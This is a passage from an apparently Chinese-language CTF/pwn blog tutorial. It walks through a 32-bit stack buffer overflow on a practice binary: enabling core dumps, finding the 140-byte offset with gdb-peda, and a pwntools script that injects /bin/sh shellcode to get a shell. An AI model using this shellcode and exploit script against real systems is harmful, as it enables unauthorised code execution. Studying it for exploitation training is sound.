class="built_in">echo</span> <span class="string">&#x27;/corefiles/core-%e-%p-%t&#x27;</span> &gt; /proc/sys/kernel/core_pattern</span><br><span class="line"><span class="built_in">ulimit</span> -c unlimited</span><br><span class="line">sudo sh -c <span class="string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br></pre></td></tr></table></figure><p>接着进行调试</p><p><strong>注意：如果重启机器关闭的ASLR或者开启的core dump都会关闭了</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop/Pwn$ ./level1 </span><br><span class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line">段错误 (核心已转储)</span><br><span class="line">kali@kali:~/Desktop/Pwn$ gdb ./level1 /tmp/core.1605753112.1826 </span><br><span class="line">Core was generated by `./level1<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">Program terminated with signal SIGSEGV, Segmentation fault.</span></span><br><span class="line"><span class="string">#0  0x41416d41 in ?? ()</span></span><br><span class="line"><span class="string">gdb-peda$ pattern offset 0x41416d41</span></span><br><span class="line"><span class="string">1094806849 found at offset: 140</span></span><br><span class="line"><span class="string">gdb-peda$ x/10s $esp-144</span></span><br><span class="line"><span class="string">0xffffd190:     &quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;...</span></span><br><span class="line"><span class="string">0xffffd225:     &quot;\n\264\374&quot;, &lt;incomplete sequence \367&gt;</span></span><br><span class="line"><span class="string">0xffffd226:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd227:     &quot;\373\367\001&quot;</span></span><br><span class="line"><span class="string">0xffffd228:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd229:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd22a:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd22b:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd22c:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd231:     &quot;&quot;</span></span><br></pre></td></tr></table></figure><p>因为溢出点是140个字节，再加上4个字节的ret地址，通过gdb的命令<code>x/10s $esp-144</code>，我们可以得到buf的地址为<strong>0xffffd190</strong>，然后利用脚本即可达到溢出执行命令的效果</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/10.png" alt="image-20201119104715107"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">ret = <span class="number">0xffffd190</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span> </span><br><span class="line">shellcode+= <span class="string">b&quot;\xd2\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line">payload = shellcode + <span class="string">b&#x27;A&#x27;</span>*(<span class="number">140</span>-<span class="built_in">len</span>(shellcode)) + p32(ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</span><br><span class="line">https://www.anquanke.com/post/id/183370</span><br><span class="line">http://www.peckerwood.top/post/rop_0x01/</span><br><span class="line">http://blog.nsfocus.net/easy-implement-shellcode-xiangjie/</span><br><span class="line">《CTF竞赛权威指南》</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
</feed>
